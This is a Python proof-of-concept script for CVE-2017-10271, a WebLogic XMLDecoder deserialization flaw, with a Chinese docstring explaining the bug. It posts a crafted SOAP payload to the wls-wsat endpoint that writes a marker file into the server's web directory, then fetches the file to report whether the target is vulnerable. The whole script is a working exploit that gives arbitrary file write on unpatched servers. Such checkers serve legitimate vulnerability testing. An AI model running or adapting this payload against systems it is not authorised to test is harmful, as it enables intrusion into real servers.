"""
    CVE-2017-10271
    Weblogic的WLS Security组件对外提供webservice服务
    其中使用了XMLDecoder来解析用户传入的XML数据，在解析的过程中出现反序列化漏洞，导致可执行任意命令。
"""

import sys

import requests

try:
    url = sys.argv[1]
except IndexError:
    exit("Please check the url.")

post_url = f"{url}/wls-wsat/CoordinatorPortType"

headers = {
    'User-Agent':
    'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0',
    'Accept':
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Upgrade-Insecure-Requests': '1',
    'Content-Type': 'text/xml'
}

exploit = '''
<soapenv:Envelope
    xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
    <soapenv:Header>
        <work:WorkContext
            xmlns:work="http://bea.com/2004/06/soap/workarea/">
            <java>
                <java version="1.4.0" class="java.beans.XMLDecoder">
                    <object class="java.io.PrintWriter">
                        <string>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/vulntools.txt</string>
                        <void method="println">
                            <string>Hello XMLDecoder - VulnTools</string>
                        </void>
                        <void method="close"/>
                    </object>
                </java>
            </java>
        </work:WorkContext>
    </soapenv:Header>
    <soapenv:Body/>
</soapenv:Envelope>
'''

try:
    r = requests.post(post_url, data=exploit, headers=headers, timeout=5)
    check_url = f"{url}/bea_wls_internal/vulntools.txt"
    check_result = requests.get(check_url, headers=headers, timeout=5)
except Exception as e:
    print(e)
else:
    if "VulnTools" in check_result.text:
        print("存在WebLogic XMLDecoder反序列化漏洞(CVE-2017-10271)")

    elif check_result.status_code != 200:
        print("不存在该漏洞.")